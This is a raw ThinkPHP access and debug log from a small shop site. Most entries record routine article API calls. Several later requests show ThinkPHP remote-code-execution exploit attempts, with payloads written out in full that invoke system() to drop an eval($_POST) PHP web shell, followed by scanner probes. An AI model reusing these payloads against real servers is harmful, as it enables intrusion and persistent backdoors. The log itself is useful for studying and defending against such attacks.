[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article',
  'route' => 'api/Article/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000436s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000579s ]
[ sql ] [ SQL ] SELECT * FROM `article` ORDER BY `id` ASC [ RunTime:0.000237s ]
---------------------------------------------------------------

[2020-09-24T18:04:38+08:00] 59.174.168.242 GET mishop.holyzq.com/api/article/edit/21
[运行时间：0.005460s] [吞吐率：183.15req/s] [内存消耗：844.62kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/edit/<id>',
  'route' => 'api/Article/edit',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000506s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000686s ]
[ sql ] [ SQL ] SELECT * FROM `article` WHERE  `id` = 21 LIMIT 1 [ RunTime:0.000369s ]
---------------------------------------------------------------

[2020-09-24T18:04:44+08:00] 59.174.168.242 OPTIONS mishop.holyzq.com/api/article/update/21
[运行时间：0.002675s] [吞吐率：373.86req/s] [内存消耗：470.60kb] [文件加载：105]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-site' => 'cross-site',
  'sec-fetch-mode' => 'cors',
  'origin' => 'http://localhost:63342',
  'access-control-request-method' => 'PUT',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2020-09-24T18:04:44+08:00] 59.174.168.242 PUT mishop.holyzq.com/api/article/update/21
[运行时间：0.006082s] [吞吐率：164.42req/s] [内存消耗：811.06kb] [文件加载：130]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/article/update/<id>',
  'route' => 'api/Article/update',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'cross_domain' => true,
    'header' => 
    array (
      'Access-Control-Allow-Credentials' => 'true',
      'Access-Control-Allow-Methods' => 'GET, POST, PATCH, PUT, DELETE',
      'Access-Control-Allow-Headers' => 'Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-Requested-With',
      'Access-Control-Allow-Origin' => '*',
    ),
  ),
  'var' => 
  array (
    'id' => '21',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate, br',
  'referer' => 'http://localhost:63342/ajax/%E9%BB%84%E8%80%81%E5%B8%88%E7%BB%83%E4%B9%A0/index.html?_ijt=sm80emji6mdejv4jugsf9s1lj1',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'origin' => 'http://localhost:63342',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'accept' => '*/*',
  'content-length' => '121',
  'connection' => 'keep-alive',
  'host' => 'mishop.holyzq.com',
)
[ info ] [ PARAM ] array (
  'title' => '放松放松当11111111',
  'content' => '发送发送给22222222',
  'id' => '21',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000433s ] mysql:host=127.0.0.1;port=3306;dbname=mishop;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.000622s ]
[ sql ] [ SQL ] UPDATE `article`  SET `title` = '放松放松当11111111' , `content` = '发送发送给22222222' , `id` = 21  WHERE  `id` = 21 [ RunTime:0.002008s ]
---------------------------------------------------------------

[2020-09-24T21:01:50+08:00] 110.43.54.236 POST www.techbimu.com/index.php
[运行时间：0.004415s] [吞吐率：226.51req/s] [内存消耗：874.12kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '170',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.18.4',
  'host' => 'www.techbimu.com',
)
[ info ] [ PARAM ] array (
  'filter' => 
  array (
    0 => 'system',
  ),
  'server' => 
  array (
    'REQUEST_METHOD' => 'echo ^<?php eval($_POST[qazw]);print(md5(1));?^> > iluzaadkjwwg.php',
  ),
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T21:01:51+08:00] 110.43.54.236 POST www.techbimu.com/index.php
[运行时间：0.003297s] [吞吐率：303.32req/s] [内存消耗：874.12kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '170',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.18.4',
  'host' => 'www.techbimu.com',
)
[ info ] [ PARAM ] array (
  'filter' => 
  array (
    0 => 'system',
  ),
  'server' => 
  array (
    'REQUEST_METHOD' => 'echo \'<?php eval($_POST[qazw]);print(md5(1));?>\' > iluzaadkjwwg.php',
  ),
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T21:01:53+08:00] 110.43.54.236 GET www.techbimu.com/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%5E%3C%3Fphp%20eval($_POST[qazw]);%3F%5E%3E%20%3E%20lxbduar.php
[运行时间：0.003305s] [吞吐率：302.58req/s] [内存消耗：531.88kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T21:01:53+08:00] 110.43.54.236 GET www.techbimu.com/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%27%3C%3Fphp%20eval($_POST[qazw]);%3F%3E%27%20%3E%20lxbduar.php
[运行时间：0.002919s] [吞吐率：342.59req/s] [内存消耗：531.88kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T21:01:53+08:00] 110.43.54.236 GET www.techbimu.com/index.php?s=/index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lxbduar.php&content=%3C%3Fphp%20eval%28%24_POST%5Bqazw%5D%29%3B%3F%3E
[运行时间：0.002769s] [吞吐率：361.14req/s] [内存消耗：531.89kb] [文件加载：108]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T21:34:19+08:00] 128.14.134.134 GET 101.132.45.200/
[运行时间：0.004383s] [吞吐率：228.15req/s] [内存消耗：872.91kb] [文件加载：188]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'host' => '101.132.45.200',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] null
---------------------------------------------------------------

[2020-09-24T21:34:31+08:00] 128.14.134.134 GET 101.132.45.200/webfig/
[运行时间：0.003348s] [吞吐率：298.68req/s] [内存消耗：533.95kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
---------------------------------------------------------------

[2020-09-24T23:12:19+08:00] 192.241.232.162 GET 101.132.45.200/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
[运行时间：0.003530s] [吞吐率：283.28req/s] [内存消耗：533.97kb] [文件加载：109]
[ info ] [ LANG ] /var/www/mishop/thinkphp/lang/zh-cn.php
